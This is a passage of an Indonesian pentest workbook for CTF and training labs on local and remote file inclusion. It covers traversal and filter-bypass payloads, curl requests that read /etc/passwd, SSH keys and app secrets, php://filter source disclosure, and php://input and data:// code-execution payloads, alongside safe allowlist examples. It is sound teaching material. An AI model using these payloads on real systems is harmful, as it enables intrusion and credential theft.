---
id: "24"
title: "Workflow 24 — LFI / RFI"
category: "3. Web Exploitation"
categoryId: "web"
filename: "24_lfi_rfi_workflow.md"
refs_out: ["06","07","14a","14c","14d","17a","23","25","44","47","64"]
refs_in: ["06","15","25","27"]
---

← [File 23: SSTI](/docs/ssti)

---

# Workflow 24 — LFI / RFI

> **Scope:** HackTheBox, TryHackMe, PortSwigger, CTF, dan lab yang memang mengizinkan pengujian eksploitasi.
> 
> **Tujuan:** membangun muscle memory dari **parameter discovery → traversal → sensitive file disclosure → wrapper abuse → log poisoning → LFI → RCE**, serta memahami kapan RFI mungkin terjadi.
> 
> **Platform:** Parrot OS XFCE, Debian-based Linux.
> 
> **Prinsip utama:**  
> **LFI confirmed ≠ RCE guaranteed.**  
> LFI adalah kemampuan aplikasi untuk mengakses file berdasarkan input attacker. Jalur menuju RCE bergantung pada interpreter, wrapper, permission, lokasi file, logging, upload functionality, dan konfigurasi server.

---

# Daftar Isi

- [Bagian 0 — LFI/RFI Fundamentals](#bagian-0--lfirfi-fundamentals)
    
    - [0.1 Path Traversal vs LFI vs RFI](#01-path-traversal-vs-lfi-vs-rfi)
        
    - [0.2 Kenapa LFI Berbahaya](#02-kenapa-lfi-berbahaya)
        
    - [0.3 Attack Surface](#03-attack-surface)
        
- [Bagian 1 — Deteksi LFI](#bagian-1--deteksi-lfi)
    
    - [1.1 Indikator Parameter Vulnerable](#11-indikator-parameter-vulnerable)
        
    - [1.2 Basic LFI Testing](#12-basic-lfi-testing)
        
    - [1.3 Windows LFI Testing](#13-windows-lfi-testing)
        
- [Bagian 2 — Path Traversal Techniques](#bagian-2--path-traversal-techniques)
    
    - [2.1 Basic Traversal](#21-basic-traversal)
        
    - [2.2 Encoding Bypass](#22-encoding-bypass)
        
    - [2.3 Filter Bypass Patterns](#23-filter-bypass-patterns)
        
    - [2.4 Depth Calculation](#24-depth-calculation)
        
- [Bagian 3 — Sensitive Files Target](#bagian-3--sensitive-files-target)
    
    - [3.1 Linux Files](#31-linux-files)
        
    - [3.2 Windows Files](#32-windows-files)
        
    - [3.3 Application-Specific Files](#33-application-specific-files)
        
- [Bagian 4 — PHP Wrappers](#bagian-4--php-wrappers)
    
    - [4.1 Konsep PHP Wrappers](#41-konsep-php-wrappers)
        
    - [4.2 `php://filter`](#42-phpfilter)
        
    - [4.3 `php://input`](#43-phpinput)
        
    - [4.4 `data://`](#44-data)
        
    - [4.5 `expect://`](#45-expect)
        
    - [4.6 `zip://` dan `phar://`](#46-zip-dan-phar)
        
    - [4.7 Wrapper Summary](#47-wrapper-summary)
        
    - [4.8 PHP Filter Chain Generator](#48-php-filter-chain-generator)
        
- [Bagian 5 — Log Poisoning](#bagian-5--log-poisoning)
    
    - [5.1 Konsep Log Poisoning](#51-konsep-log-poisoning)
        
    - [5.2 Apache/Nginx Access Log Poisoning](#52-apachenginx-access-log-poisoning)
        
    - [5.3 SSH Log Poisoning](#53-ssh-log-poisoning)
        
    - [5.4 Mail Log Poisoning](#54-mail-log-poisoning)
        
    - [5.5 `/proc/self/environ` Poisoning](#55-procselfenviron-poisoning)
        
- [Bagian 6 — LFI to RCE Paths](#bagian-6--lfi-to-rce-paths)
    
    - [6.1 Decision Tree LFI → RCE](#61-decision-tree-lfi--rce)
        
    - [6.2 Upload + LFI Combo](#62-upload--lfi-combo)
        
- [Bagian 7 — Remote File Inclusion](#bagian-7--remote-file-inclusion-rfi)
    
    - [7.1 RFI Fundamentals](#71-rfi-fundamentals)
        
    - [7.2 Basic RFI](#72-basic-rfi)
        
    - [7.3 RFI via SMB](#73-rfi-via-smb)
        
    - [7.4 RFI Filter Bypass](#74-rfi-filter-bypass)
        
- [Bagian 8 — Tools & Automation](#bagian-8--tools--automation)
    
    - [8.1 Manual Testing dengan curl](#81-manual-testing-dengan-curl)
        
    - [8.2 ffuf untuk LFI](#82-ffuf-untuk-lfi)
        
    - [8.4 Script `lfi_detect.sh`](#84-script-lfidetectsh)
        
    - [8.5 LFI di Non-PHP Context](#85-lfi-di-non-php-context)
        
- [Bagian 9 — Decision Tree Lengkap](#bagian-9--decision-tree-lengkap)
    
- [Bagian 10 — Common Errors & Troubleshooting](#bagian-10--common-errors--troubleshooting)
    
- [Muscle Memory — LFI 60 Seconds](#muscle-memory--lfi-60-seconds)
    
- [Master Checklist](#master-checklist)
    
- [Quick Command Reference](#quick-command-reference)
    

---

# Bagian 0 — LFI/RFI Fundamentals

# 0.1 Path Traversal vs LFI vs RFI

### 📌 Kapan Digunakan

Gunakan bagian ini setiap kali menemukan parameter yang tampak menentukan **file, template, page, document, language, atau path**. Sebelum mengeksploitasi, tentukan dulu apakah masalahnya sekadar traversal atau benar-benar file inclusion.

---

## Path Traversal

Path Traversal terjadi ketika input attacker dapat mengubah lokasi file yang diakses aplikasi.

Contoh vulnerable:

```php
<?php

$file = $_GET['file'];

echo file_get_contents("/var/www/html/files/" . $file);
```

Request normal:

```text
?file=about.txt
```

Masalah:

```text
?file=../../../../etc/passwd
```

Aplikasi dapat membentuk:

```text
/var/www/html/files/../../../../etc/passwd
```

yang setelah normalisasi dapat mengarah ke:

```text
/etc/passwd
```

### Impact

Path traversal biasanya berarti:

```text
Attacker
   ↓
Manipulasi path
   ↓
File arbitrary read/access
```

Belum tentu ada PHP code execution.

---

## LFI — Local File Inclusion

LFI terjadi ketika aplikasi melakukan **include/load terhadap file lokal** berdasarkan input attacker.

Contoh:

```php
<?php

$page = $_GET['page'];

include($page);
```

Request:

```text
?page=../../../../etc/passwd
```

Jika target mengizinkan file dibaca/di-include, terjadi LFI.

Perbedaan penting:

```text
Path Traversal
→ arbitrary local path access

LFI
→ application include/load local resource
```

LFI pada aplikasi PHP jauh lebih menarik karena file yang di-include dapat diproses oleh PHP interpreter.

---

## RFI — Remote File Inclusion

RFI terjadi ketika aplikasi dapat meng-include resource dari lokasi remote:

```text
http://ATTACKER/file.php
```

Secara konseptual:

```text
Victim Server
      |
      | fetch
      v
Attacker Server
      |
      v
Remote PHP / payload
```

Kemudian target memproses resource tersebut sesuai behavior include.

---

## Diagram Besar

```text
                  USER INPUT
                      |
                      v
            +-------------------+
            | file/page/path= ? |
            +-------------------+
                      |
                      v
             APPLICATION LOGIC
                      |
          +-----------+-----------+
          |                       |
          v                       v
     File Access              File Include
          |                       |
          v                       v
   Path Traversal               LFI
                                  |
                    +-------------+-------------+
                    |                           |
                    v                           v
             Local File Read               PHP Processing
                                                |
                                                v
                                         Possible RCE
                                                ^
                                                |
                                         wrappers/log/
                                         upload/proc
                                                 
                    Remote Resource
                          |
                          v
                         RFI
                          |
                          v
                  Remote Inclusion
```

---

## Kapan Vulnerability Muncul?

Pattern yang patut dicurigai:

```php
include($_GET['page']);
require($_GET['file']);
include_once($_GET['template']);
require_once($_GET['view']);
```

atau wrapper logic seperti:

```php
$file = $_GET['file'];
readfile($file);
```

atau:

```php
$template = $_GET['template'];
load_template($template);
```

---

## Vulnerable vs Aman

### Vulnerable

```php
<?php

$page = $_GET['page'];

include($page);
```

Masalah:

```text
User controls full path
```

---

### Lebih Aman — Allowlist

```php
<?php

$pages = [
    'home'  => __DIR__ . '/pages/home.php',
    'about' => __DIR__ . '/pages/about.php',
    'login' => __DIR__ . '/pages/login.php',
];

$page = $_GET['page'] ?? 'home';

if (!isset($pages[$page])) {
    http_response_code(404);
    exit('Page not found');
}

include($pages[$page]);
```

Sekarang user hanya memilih **identifier**, bukan arbitrary filesystem path.

---

## Contoh Aman Lain

```php
<?php

$file = basename($_GET['file'] ?? '');

$base = realpath(__DIR__ . '/files');
$target = realpath($base . DIRECTORY_SEPARATOR . $file);

if ($target === false ||
    !str_starts_with($target, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(404);
    exit('Invalid file');
}

readfile($target);
```

Tetapi bahkan validasi path harus disesuaikan dengan framework, filesystem, symlink behavior, dan kebutuhan aplikasi.

---

# 0.2 Kenapa LFI Berbahaya

### 📌 Kapan Digunakan

Gunakan ketika LFI sudah terkonfirmasi untuk menentukan **jalur escalation** berikutnya.

---

## 1. Sensitive File Read

Target awal umum pada Linux:

```text
/etc/passwd
```

atau:

```text
/etc/hosts
/etc/hostname
/proc/self/environ
```

Contoh:

```text
LFI
 ↓
/etc/passwd
 ↓
User enumeration
 ↓
Potential next attack surface
```

---

## 2. SSH Private Key

Jika konteks user/path dapat diprediksi:

```text
/home/USERNAME/.ssh/id_rsa
```

Informasi ini dapat sangat sensitif karena berpotensi memungkinkan authentication ke sistem lain.

Dalam CTF, key kadang disimpan:

```text
/root/.ssh/id_rsa
/home/user/.ssh/id_rsa
```

---

## 3. Log Poisoning

Konsep:

```text
Attacker-controlled header
       |
       v
Web server log
       |
       v
LFI reads log
       |
       v
PHP interprets injected content
       |
       v
Potential code execution
```

Ini salah satu jalur klasik:

```text
LFI → write attacker-controlled bytes somewhere
    → include that file
    → interpreter executes content
```

---

## 4. PHP Wrappers

PHP memiliki stream wrappers yang dapat mengubah cara resource diakses.

Salah satu yang paling penting:

```text
php://filter
```

Tujuannya bukan RCE, melainkan:

```text
Source Code Disclosure
```

Kemudian source code dapat mengungkap:

```text
DB credentials
Secret keys
Internal paths
Authentication logic
Hidden endpoints
```

---

## 5. PHP Input / Data

Dalam konfigurasi tertentu, wrapper dapat menjadi execution primitive:

```text
php://input
data://
```

Tetapi availability sangat bergantung pada:

```text
PHP version
php.ini
allow_url_include
wrapper availability
application include behavior
```

---

## LFI → Full RCE

```text
                 LFI
                  |
      +-----------+-----------+
      |           |           |
      v           v           v
   Wrapper      Upload       Logs
      |           |           |
      |           |           |
      v           v           v
php://input   PHP file    Poison log
data://       uploaded        |
      |           |            |
      +-----------+------------+
                  |
                  v
             PHP INCLUDE
                  |
                  v
               RCE
```

---

# 0.3 Attack Surface

### 📌 Kapan Digunakan

Gunakan saat melakukan parameter discovery. Jangan hanya mencari `file=`; LFI dapat tersembunyi pada banyak konteks.

---

## GET Parameter

Pattern umum:

```text
file=
page=
include=
path=
doc=
template=
view=
lang=
dir=
load=
```

Contoh:

```http
GET /index.php?page=home
```

---

## POST Parameter

```http
POST /render.php

template=home
```

Test:

```text
template=../../../../etc/passwd
```

---

## Cookie-Based

Misalnya aplikasi:

```text
Cookie: lang=en
```

dan server membuat:

```php
include($_COOKIE['lang']);
```

Maka injection dapat berada di cookie.

---

## HTTP Header

Header dapat menjadi attack surface jika server memasukkannya ke:

```text
template
log
view
include path
```

Contoh:

```text
User-Agent
Referer
X-Forwarded-For
Custom header
```

---

## Upload + LFI

Flow:

```text
Upload file
      |
      v
Find storage path
      |
      v
LFI
      |
      v
Include uploaded file
      |
      v
Potential PHP execution
```

---

# Bagian 1 — Deteksi LFI

# 1.1 Indikator Parameter Vulnerable

### 📌 Kapan Digunakan

Gunakan saat melakukan fuzzing endpoint dan parameter.

---

## Nama Parameter Yang Sering Dicurigai

|Parameter|Contoh|
|---|---|
|`file`|`?file=home.txt`|
|`page`|`?page=home`|
|`include`|`?include=menu.php`|
|`path`|`?path=docs/readme.txt`|
|`doc`|`?doc=manual.pdf`|
|`template`|`?template=home.php`|
|`view`|`?view=dashboard`|
|`lang`|`?lang=en`|
|`dir`|`?dir=reports`|
|`load`|`?load=module.php`|

---

## Error Messages

Petunjuk LFI:

```text
include(): Failed opening required
include(): Failed to open stream
require(): Failed opening required
failed to open stream
No such file or directory
Permission denied
```

PHP example:

```text
Warning: include(../../../../etc/passwd):
failed to open stream: No such file or directory
```

Ini sangat berguna karena error dapat mengungkap:

```text
Target path
Working directory
Filesystem
Framework
```

---

## Reflection vs Inclusion

Input:

```text
?page=../../../../etc/passwd
```

Response:

```text
../../../../etc/passwd
```

hanya menunjukkan:

```text
Reflection
```

Sedangkan:

```text
root:x:0:0:root:/root:/bin/bash
```

menunjukkan:

```text
File content reached the response
```

---

# 1.2 Basic LFI Testing

### 📌 Kapan Digunakan

Gunakan setelah menemukan parameter yang mungkin mengontrol file/path.

---

## Payload Linux

Mulai dengan traversal secukupnya:

```text
../../../../etc/passwd
```

Atau:

```text
../../../etc/passwd
```

---

## curl

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=../../../../etc/passwd'
```

Jika target menggunakan:

```text
http://10.10.10.10/index.php?page=...
```

maka output dapat berisi:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

---

## Cara Membaca `/etc/passwd`

Format:

```text
username:x:UID:GID:GECOS:home:shell
```

Contoh:

```text
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Artinya:

```text
username = www-data
UID      = 33
GID      = 33
home     = /var/www
shell    = /usr/sbin/nologin
```

Cari:

```text
UID 0
human users
service users
home directories
login shells
```

Contoh:

```text
root:x:0:0:root:/root:/bin/bash
```

berarti:

```text
root
UID 0
home /root
shell /bin/bash
```

---

## Validasi Lebih Kuat

Jangan hanya bergantung pada:

```text
HTTP 200
```

Gunakan kombinasi:

```text
Status
Response length
Known marker
Body content
Error changes
```

---

# 1.3 Windows LFI Testing

### 📌 Kapan Digunakan

Gunakan ketika:

```text
IIS
ASP.NET
Windows host
XAMPP
Windows service
```

terlihat dari fingerprinting.

---

## `win.ini`

Target paling sederhana:

```text
C:\Windows\win.ini
```

Traversal:

```text
../../../../windows/win.ini
```

Expected:

```text
[fonts]
[extensions]
[mci extensions]
```

atau Windows-specific sections lainnya, tergantung sistem.

---

## `hosts`

```text
C:\Windows\System32\drivers\etc\hosts
```

curl:

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=../../../../windows/system32/drivers/etc/hosts'
```

---

## Mixed Slash

Pada target Windows, beberapa aplikasi menerima:

```text
../
..\ 
```

atau kombinasi:

```text
../..\../
```

Contoh:

```text
..\..\..\windows\win.ini
```

---

## Drive Letter

Jika absolute path diterima:

```text
C:\Windows\win.ini
```

dapat dicoba.

URL encoding:

```text
C%3A%5CWindows%5Cwin.ini
```

Gunakan hanya bila input handling target memang memungkinkan.

---

# Bagian 2 — Path Traversal Techniques

# 2.1 Basic Traversal

### 📌 Kapan Digunakan

Gunakan sebagai **test pertama** sebelum mencoba encoding atau bypass yang lebih kompleks.

---

## Linux

```text
../
../../
../../../
../../../../
```

Target:

```text
../../../../etc/passwd
```

---

## Windows

```text
..\
..\..\
..\..\..\
..\..\..\Windows\win.ini
```

---

## curl

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'file=../../../../etc/passwd'
```

Windows:

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'file=..\..\..\Windows\win.ini'
```

---

## Absolute Path

Bila aplikasi menerima absolute path:

```text
/etc/passwd
```

atau:

```text
C:\Windows\win.ini
```

tidak perlu traversal sama sekali.

---

# 2.2 Encoding Bypass

### 📌 Kapan Digunakan

Gunakan ketika raw traversal ditolak oleh filter atau WAF tetapi server melakukan decoding/normalization pada tahap berikutnya.

---

## URL Encoding

Raw:

```text
../
```

Encoded:

```text
%2e%2e%2f
```

Full payload:

```text
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

curl:

```bash
curl 'http://10.10.10.10/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
```

---

## Double Encoding

Raw encoded:

```text
%2e%2e%2f
```

Double encoded:

```text
%252e%252e%252f
```

curl:

```bash
curl 'http://10.10.10.10/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
```

Bekerja hanya bila terdapat **dua decoding stages** yang relevan.

---

## UTF-8 / Normalization Bypass

Beberapa filter tua atau custom parser dapat memperlakukan:

```text
encoded form
Unicode-normalized form
filesystem form
```

secara berbeda.

Prinsip pengujian:

```text
raw
 ↓
URL decode
 ↓
application normalization
 ↓
filesystem normalization
```

Cari perbedaan di antara setiap tahap.

Jangan menganggap "Unicode bypass" universal; implementasi server berbeda-beda.

---

## Null Byte — Legacy PHP

Payload klasik:

```text
../../../../etc/passwd%00
```

Contoh:

```bash
curl 'http://10.10.10.10/index.php?page=../../../../etc/passwd%00'
```

Namun:

```text
PHP modern
```

umumnya tidak lagi rentan terhadap teknik null-byte termination klasik.

Teknik ini terutama penting untuk memahami:

```text
PHP < 5.3.4
```

dan challenge lama.

---

## Tabel

|Bypass|Contoh|Catatan|
|---|---|---|
|URL encoding|`%2e%2e%2f`|Tergantung decoding|
|Double encoding|`%252e%252e%252f`|Membutuhkan dua decoding stage|
|Backslash|`..\..\`|Berguna pada Windows|
|Mixed slash|`../..\`|Bergantung normalization|
|Null byte|`%00`|Legacy PHP|
|Absolute path|`/etc/passwd`|Tidak membutuhkan traversal|
|Unicode normalization|implementation-specific|Sangat application-dependent|

---

# 2.3 Filter Bypass Patterns

### 📌 Kapan Digunakan

Gunakan ketika raw `../` terdeteksi atau dibersihkan.

---

## `....//`

Konsep klasik:

```text
....//
```

Setelah aplikasi menghapus substring `../` satu kali:

```text
....//
 ↓
../
```

Contoh:

```bash
curl 'http://10.10.10.10/index.php?page=....//....//....//etc/passwd'
```

Ini hanya bekerja pada filter yang:

```text
remove "../"
```

tanpa melakukan normalization dengan benar.

---

## `..././`

Konsep:

```text
..././
```

dapat menghasilkan path traversal setelah parser melakukan:

```text
./ normalization
```

Contoh:

```bash
curl 'http://10.10.10.10/index.php?page=..././..././..././etc/passwd'
```

Tidak universal.

---

## Absolute Path Bypass

Jika filter fokus terhadap:

```text
../
```

tetapi tidak melarang absolute path:

```text
/etc/passwd
```

langsung dicoba.

```bash
curl 'http://10.10.10.10/index.php?page=/etc/passwd'
```

---

## Path Normalization

Perhatikan bahwa security decision seharusnya dilakukan terhadap:

```text
canonical path
```

bukan string mentah.

Contoh mental model:

```text
Input
 ↓
URL decode
 ↓
Normalize path
 ↓
Canonicalize
 ↓
Check allowlist/base directory
 ↓
Open file
```

Filter string sederhana biasanya jauh lebih lemah:

```text
if "../" in input:
    deny
```

---

## Filter → Bypass

|Filter/Behavior|Kandidat Bypass|Syarat|
|---|---|---|
|`../` dihapus satu kali|`....//`|Poor sanitization|
|`../` diblokir|URL encoding|Decode terjadi setelah filter|
|URL encoding diblokir|Double encoding|Dua decoding stage|
|`/` diblokir|`\`|Windows/application-specific|
|Dot traversal diblokir|Absolute path|Absolute path accepted|
|Prefix ditambahkan|Traversal setelah prefix|Concatenation vulnerable|
|File extension ditambahkan|Legacy null byte|PHP lama|
|Case-sensitive filter|Case variation|Hanya bila token filesystem relevan|
|Raw string matching|Alternate normalization|Parser mismatch|

---

# 2.4 Depth Calculation

### 📌 Kapan Digunakan

Gunakan ketika payload dasar gagal karena jumlah `../` belum mencapai root filesystem.

---

## Konsep

Misalnya application directory:

```text
/var/www/html/
```

Kita ingin:

```text
/etc/passwd
```

Traversal:

```text
/var/www/html/
    ..
    /var/www/
    ..
    /var/
    ..
    /
    etc/passwd
```

Jadi:

```text
../../../etc/passwd
```

Perhitungannya:

```text
/var/www/html/
       |
       +-- .. → /var/www/
       +-- .. → /var/
       +-- .. → /
       |
       +-- etc/passwd
```

**Jangan menggunakan angka 3 secara buta pada semua target.**

Jika inclusion terjadi dari:

```text
/var/www/html/includes/
```

jumlah traversal bisa berbeda.

---

## Manual Generator

```bash
for depth in 1 2 3 4 5 6 7; do
    printf '%*s' "$((depth * 3))" '' | tr ' ' '.'
    printf '/etc/passwd\n'
done
```

Namun untuk workflow yang lebih jelas, gunakan script berikut.

---

## Script `generate_traversal.sh`

```bash
#!/usr/bin/env bash

set -euo pipefail

usage() {
    echo "Usage: $0 <max_depth>"
    echo
    echo "Example:"
    echo "  $0 8"
}

if [[ $# -ne 1 ]]; then
    echo "[!] Exactly one argument is required." >&2
    usage
    exit 1
fi

MAX_DEPTH="$1"
TARGET_FILE="etc/passwd"

# Input validation:
# only positive integers from 1-50
if [[ ! "$MAX_DEPTH" =~ ^[1-9][0-9]?$ ]]; then
    echo "[!] Depth must be a positive integer." >&2
    exit 1
fi

if (( MAX_DEPTH > 50 )); then
    echo "[!] Maximum supported depth is 50." >&2
    exit 1
fi

for (( depth=1; depth<=MAX_DEPTH; depth++ )); do
    payload=""
    for (( i=1; i<=depth; i++ )); do
        payload+="../"
    done
    printf '%2d → %s%s\n' "$depth" "$payload" "$TARGET_FILE"
done
```

---

## Menjalankan

```bash
chmod +x generate_traversal.sh
./generate_traversal.sh 8
```

Output:

```text
 1 → ../etc/passwd
 2 → ../../etc/passwd
 3 → ../../../etc/passwd
 4 → ../../../../etc/passwd
 5 → ../../../../../etc/passwd
 6 → ../../../../../../etc/passwd
 7 → ../../../../../../../etc/passwd
 8 → ../../../../../../../../etc/passwd
```

---

# Bagian 3 — Sensitive Files Target

# 3.1 Linux Files

### 📌 Kapan Digunakan

Gunakan setelah LFI dikonfirmasi. Jangan mencoba semua file secara acak; prioritaskan berdasarkan target, privilege, framework, dan tujuan challenge.

|File Path|Isi yang Dicari|Prioritas|
|---|---|---|
|`/etc/passwd`|Users, UID/GID, home path, shell|**P0**|
|`/etc/shadow`|Password hashes|P1|
|`/etc/hosts`|Hostnames/internal mappings|**P0**|
|`/etc/hostname`|Hostname|P0|
|`/proc/self/environ`|Environment variables, secrets|**P0**|
|`/proc/self/cmdline`|Process command line|P1|
|`/proc/self/exe`|Executable reference|P2|
|`/proc/net/tcp`|TCP sockets/connections|P1|
|`~/.ssh/id_rsa`|Private SSH key|**P0**|
|`~/.ssh/authorized_keys`|SSH authorized keys|P1|
|`~/.bash_history`|Commands/user activity|P1|
|`/var/log/apache2/access.log`|HTTP logs, potential poisoned content|**P0**|
|`/var/log/apache2/error.log`|Server errors|P1|
|`/var/log/auth.log`|Authentication events|P1|
|`/var/log/nginx/access.log`|HTTP logs|**P0**|
|`/var/mail/www-data`|Application mail|P2|
|`/var/www/html/config.php`|DB credentials, secrets|**P0**|
|`/var/www/html/.env`|Application secrets|**P0**|
|`/etc/nginx/nginx.conf`|Server configuration|P1|
|`/etc/apache2/apache2.conf`|Apache configuration|P1|
|`/etc/ssh/sshd_config`|SSH configuration|P1|
|`/etc/resolv.conf`|DNS configuration|P2|
|`/proc/self/status`|Process UID/GID/capabilities info|P1|
|`/proc/self/maps`|Loaded memory mappings|P2|
|`/proc/version`|Kernel information|P2|

> `~` bukan path literal yang selalu dipahami application. Ganti dengan home directory aktual jika sudah diketahui.

---

## `/etc/passwd`

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Gunakan untuk:

```text
username discovery
UID discovery
home directory discovery
shell discovery
```

---

## `/proc/self/environ`

Target:

```text
/proc/self/environ
```

Potensial berisi:

```text
PATH=
HOME=
USER=
PWD=
DATABASE_URL=
SECRET_KEY=
APP_ENV=
```

Output sering tidak nyaman dibaca karena NUL byte:

```text
VAR=value^@VAR2=value^@VAR3=value
```

---

## `/proc/self/cmdline`

Berguna untuk menemukan cara aplikasi dijalankan:

```text
python app.py
gunicorn app:app
php-fpm
apache2
```

---

## `/proc/net/tcp`

Dapat menunjukkan koneksi/listening socket dalam bentuk encoded hex.

Gunakan ketika perlu:

```text
internal service discovery
```

---

## Web Config

Contoh:

```text
/var/www/html/config.php
```

Cari:

```text
DB_HOST
DB_USER
DB_PASSWORD
API_KEY
SECRET_KEY
```

---

# 3.2 Windows Files

### 📌 Kapan Digunakan

Gunakan ketika target fingerprint menunjukkan Windows/IIS/XAMPP.

|File Path|Isi yang Dicari|Prioritas|
|---|---|---|
|`C:\Windows\System32\drivers\etc\hosts`|Hostname mappings|**P0**|
|`C:\Windows\win.ini`|Basic Windows fingerprint|**P0**|
|`C:\Windows\System32\config\SAM`|Local account database|P1|
|`C:\Users\Administrator\Desktop\flag.txt`|CTF flag candidate|**P0**|
|`C:\inetpub\wwwroot\web.config`|IIS/ASP.NET configuration|**P0**|
|`C:\xampp\htdocs\config.php`|PHP app configuration|P1|
|`C:\Windows\repair\sam`|Legacy SAM location|P2|
|`C:\Windows\System32\drivers\etc\services`|Service definitions|P2|
|`C:\Users\Public\`|Shared files|P2|

> SAM umumnya membutuhkan privilege tinggi untuk membaca. LFI success tidak otomatis berarti privilege issue hilang.

---

## curl

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=../../../../windows/win.ini'
```

---

# 3.3 Application-Specific Files

### 📌 Kapan Digunakan

Gunakan setelah fingerprint framework/CMS diketahui. File aplikasi sering lebih bernilai daripada file OS generik.

|Platform|File|Yang Dicari|
|---|---|---|
|WordPress|`wp-config.php`|DB credentials, salts|
|Joomla|`configuration.php`|DB credentials/config|
|Laravel|`.env`|APP_KEY, database, service secrets|
|Django|`settings.py`|SECRET_KEY, DB, debug config|
|Flask|`app.py`|Routes, config, secrets|
|Flask|`config.py`|Secret/config|
|Apache|`.htaccess`|Rewrite/access behavior|
|Nginx|`nginx.conf`|Virtual hosts/config|
|SSH|`/etc/ssh/sshd_config`|Auth configuration|
|PHP|`php.ini`|Inclusion/wrapper-related configuration|

---

## Laravel `.env`

Typical interests:

```text
APP_KEY=
APP_ENV=
DB_HOST=
DB_DATABASE=
DB_USERNAME=
DB_PASSWORD=
```

Target:

```text
/var/www/html/.env
```

---

## WordPress

Common path:

```text
/var/www/html/wp-config.php
```

Cari:

```php
DB_NAME
DB_USER
DB_PASSWORD
DB_HOST
AUTH_KEY
SECURE_AUTH_KEY
```

---

## Django

Typical:

```text
settings.py
```

Cari:

```text
SECRET_KEY
DATABASES
DEBUG
ALLOWED_HOSTS
```

---

# Bagian 4 — PHP Wrappers

# 4.1 Konsep PHP Wrappers

### 📌 Kapan Digunakan

Gunakan ketika target adalah PHP dan LFI sudah confirmed. Wrapper sering menjadi perbedaan antara:

```text
file read
```

dan:

```text
source disclosure / code execution
```

---

## Apa Itu Stream Wrapper?

PHP menyediakan mekanisme untuk mengakses resource dengan scheme:

```text
php://
data://
file://
zip://
phar://
expect://
```

Contoh:

```text
php://filter/...
```

Tidak semua wrapper tersedia atau cocok untuk `include()`.

---

## Wrapper Attack Surface

```text
LFI
 |
 +-- php://filter
 |      |
 |      +-- source disclosure
 |
 +-- php://input
 |      |
 |      +-- code execution
 |
 +-- data://
 |      |
 |      +-- code execution
 |
 +-- zip://
 |      |
 |      +-- uploaded archive
 |
 +-- phar://
 |      |
 |      +-- archive/object behavior
 |
 +-- expect://
        |
        +-- direct command execution
```

---

# 4.2 `php://filter`

### 📌 Kapan Digunakan

Gunakan **setelah LFI confirmed** ketika file PHP dibaca tetapi output yang terlihat adalah hasil execution, bukan source code.

Ini merupakan salah satu teknik paling penting untuk CTF.

---

## Masalah LFI PHP

Misalnya:

```text
?page=index.php
```

Response mungkin hanya menunjukkan rendered HTML:

```html
<html>
<body>
Welcome
</body>
</html>
```

Padahal kita ingin source code:

```php
<?php

$db_password = "secret";
...
```

---

## Payload

```text
php://filter/convert.base64-encode/resource=index.php
```

curl:

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php'
```

Expected response:

```text
PD9waHAKJGRiX3Bhc3N3b3JkID0gInNlY3JldCI7...
```

---

## Decode

Simpan output:

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' \
  | base64 -d
```

Contoh output:

```php
<?php

$db_host = "127.0.0.1";
$db_user = "app";
$db_password = "secret";

include("config.php");
```

---

## Jika HTML Membungkus Base64

Gunakan:

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=config.php' \
  | tr -d '\n' \
  | base64 -d
```

Jika ada HTML noise, ekstrak terlebih dahulu dengan tool yang sesuai atau Burp.

---

## Multiple Filter Chain

Contoh:

```text
php://filter/read=convert.base64-encode/resource=config.php
```

atau:

```text
php://filter/convert.base64-encode/resource=../config.php
```

---

## Target File Yang Menarik

```text
index.php
config.php
db.php
login.php
admin.php
routes.php
.env
wp-config.php
```

---

# 4.3 `php://input`

### 📌 Kapan Digunakan

Gunakan pada **PHP lab yang meng-include input stream sebagai PHP code**, terutama ketika upload/log poisoning tidak tersedia.

Teknik ini sangat configuration-dependent.

---

## Konsep

Attacker mengirim:

```text
POST body
   |
   v
php://input
   |
   v
include()
   |
   v
PHP interpreter
```

Payload lab:

```php
<?php system('id'); ?>
```

---

## curl

Misalkan:

```text
?page=php://input
```

Request:

```bash
curl -s \
  -X POST \
  'http://10.10.10.10/index.php?page=php://input' \
  --data "<?php system('id'); ?>"
```

Expected pada environment vulnerable:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Hal yang Harus Ada

Kurang lebih:

```text
LFI
+
php://input accessible
+
application uses include/require
+
POST body available
+
PHP interprets included stream
```

Jika:

```text
allow_url_include = Off
```

atau wrapper/include behavior berbeda, teknik ini dapat gagal.

---

## Validasi Aman

Daripada langsung mencoba command kompleks, mulai dari:

```php
<?php echo "LFI_INPUT_OK"; ?>
```

Request:

```bash
curl -s \
  -X POST \
  'http://10.10.10.10/index.php?page=php://input' \
  --data '<?php echo "LFI_INPUT_OK"; ?>'
```

Expected:

```text
LFI_INPUT_OK
```

Kemudian baru validasi command execution menggunakan:

```php
<?php echo shell_exec('id'); ?>
```

pada lab yang memang mengizinkan.

---

# 4.4 `data://`

### 📌 Kapan Digunakan

Gunakan ketika `php://input` tidak praktis tetapi `data://` wrapper dan konfigurasi remote include memungkinkan.

---

## Plain Text

Konsep:

```text
data://text/plain,<PHP_CODE>
```

Contoh lab:

```text
data://text/plain,<?php system('id'); ?>
```

